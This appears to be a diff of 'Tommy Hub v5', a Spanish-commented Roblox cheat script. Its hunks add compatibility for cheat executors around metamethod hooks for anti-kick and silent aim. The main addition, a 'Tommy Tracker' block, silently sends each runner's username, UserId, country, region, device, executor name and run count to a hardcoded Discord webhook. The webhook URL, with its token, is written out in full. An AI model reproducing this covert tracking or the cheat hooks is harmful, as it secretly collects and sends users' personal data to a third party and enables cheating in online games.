@@ -222,7 +222,9 @@ task.spawn(function()
     end
 end)
 
+-- Anti kick compatible Delta (solo executors con metamethod hook)
 pcall(function()
+    if not (getrawmetatable and setreadonly and newcclosure) then return end
     local mt  = getrawmetatable(game)
     local old = mt.__namecall
     setreadonly(mt, false)
@@ -575,16 +577,26 @@ end
 pcall(function() game:GetService("CoreGui"):FindFirstChild("TommyHub_v5"):Destroy() end)
 pcall(function() lp:WaitForChild("PlayerGui"):FindFirstChild("TommyHub_v5"):Destroy() end)
 
+-- Compatible con Delta, Xeno, Solara, Fluxus, Synapse
 local guiParent
 if typeof(gethui) == "function" then
+    -- Xeno, Solara y forks modernos
     guiParent = gethui()
 elseif typeof(get_hidden_gui) == "function" then
     guiParent = get_hidden_gui()
 else
-    local cok = pcall(function()
-        local t = Instance.new("ScreenGui"); t.Parent = game:GetService("CoreGui"); t:Destroy()
+    -- Delta y otros: intentar CoreGui, si falla usar PlayerGui
+    local cok, cerr = pcall(function()
+        local t = Instance.new("ScreenGui")
+        t.Parent = game:GetService("CoreGui")
+        t:Destroy()
     end)
-    guiParent = cok and game:GetService("CoreGui") or lp:WaitForChild("PlayerGui")
+    if cok then
+        guiParent = game:GetService("CoreGui")
+    else
+        -- Delta usa PlayerGui sin restricciones
+        guiParent = lp:WaitForChild("PlayerGui")
+    end
 end
 
 local ScreenGui = New("ScreenGui", {
@@ -1050,7 +1062,9 @@ local function installSilentAim()
             else PVP.SilentTarget=nil; PVP.SilentPos=nil end
         end) else PVP.SilentTarget=nil; PVP.SilentPos=nil end
     end end)
+    -- Hook namecall (solo executors avanzados, en Delta se omite silenciosamente)
     task.spawn(function()
+        if not (getrawmetatable and setreadonly and newcclosure and getnamecallmethod) then return end
         local mt=getrawmetatable(game); local oldNC=mt.__namecall; setreadonly(mt,false)
         mt.__namecall=newcclosure(function(...)
             local method=getnamecallmethod(); local args={...}
@@ -1350,6 +1364,128 @@ AddSection(P.Misc,"Info")
 AddLabel(P.Misc,"👑  Tommy Hub v5.00 PREMIUM",C.GOLD)
 AddLabel(P.Misc,"🔧  by terrino48",C.ACCENT2)
 AddLabel(P.Misc,"💜  Interfaz 100% custom — sin librerías",C.TEXTDIM)
+-- ==================== 🔥 TOMMY TRACKER LIMPIO ====================
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local Player = Players.LocalPlayer
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1505037161475346484/wl-SSZC8ifk4ynVBYj6sCjfSslbUM2n9JEnk4cV13LkN6e0PVC8TGLAXvPBsbi-MdIsQ"
+
+-- ==================== 🔢 CONTADOR ====================
+
+local FILE = "tommy_exec_count.txt"
+
+local function LoadCount()
+    if isfile and isfile(FILE) then
+        return tonumber(readfile(FILE)) or 0
+    end
+    return 0
+end
+
+local function SaveCount(v)
+    if writefile then
+        writefile(FILE, tostring(v))
+    end
+end
+
+local EXEC_COUNT = LoadCount() + 1
+SaveCount(EXEC_COUNT)
+
+-- ==================== 🌍 GEO ====================
+
+local function GetLocation()
+    local ok, res = pcall(function()
+        return game:HttpGet("http://ip-api.com/json/")
+    end)
+
+    if ok then
+        local d = HttpService:JSONDecode(res)
+        return {
+            country = d.country or "N/A",
+            region = d.regionName or "N/A"
+        }
+    end
+
+    return {country="Error", region="Error"}
+end
+
+local loc = GetLocation()
+
+-- ==================== 📱 DISPOSITIVO ====================
+
+local function GetDevice()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Móvil 📱"
+    elseif UserInputService.GamepadEnabled then
+        return "Consola 🎮"
+    else
+        return "PC 💻"
+    end
+end
+
+-- ==================== ⚙️ EXECUTOR ====================
+
+local function GetExecutor()
+    local name = "Desconocido"
+    pcall(function()
+        if identifyexecutor then
+            name = identifyexecutor()
+        elseif getexecutorname then
+            name = getexecutorname()
+        end
+    end)
+    return name
+end
+
+-- ==================== 📩 WEBHOOK ====================
+
+local lastSend = 0
+local cooldown = 10
+
+local function SendWebhook(title, fields)
+    if os.time() - lastSend < cooldown then return end
+    lastSend = os.time()
+
+    local data = {}
+
+    for _,v in pairs(fields) do
+        table.insert(data,{
+            name = v.name,
+            value = v.value,
+            inline = true
+        })
+    end
+
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = title,
+                    color = 65280,
+                    fields = data,
+                    footer = {text = "Tommy Tracker"}
+                }}
+            })
+        })
+    end)
+end
+
+-- ==================== 🚀 ENVIAR ====================
+
+SendWebhook("HUB ACTIVADO", {
+    {name = "Jugador", value = Player.Name},
+    {name = "UserId", value = tostring(Player.UserId)},
+    {name = "País", value = loc.country},
+    {name = "Región / Estado", value = loc.region},
+    {name = "Dispositivo", value = GetDevice()},
+    {name = "Executor", value = GetExecutor()},
+    {name = "Veces ejecutado", value = tostring(EXEC_COUNT)}
+})
 -- ═══════════════════════════════════════════════════════════
 --  NOTIFICACIÓN DE CARGA
 -- ═══════════════════════════════════════════════════════════
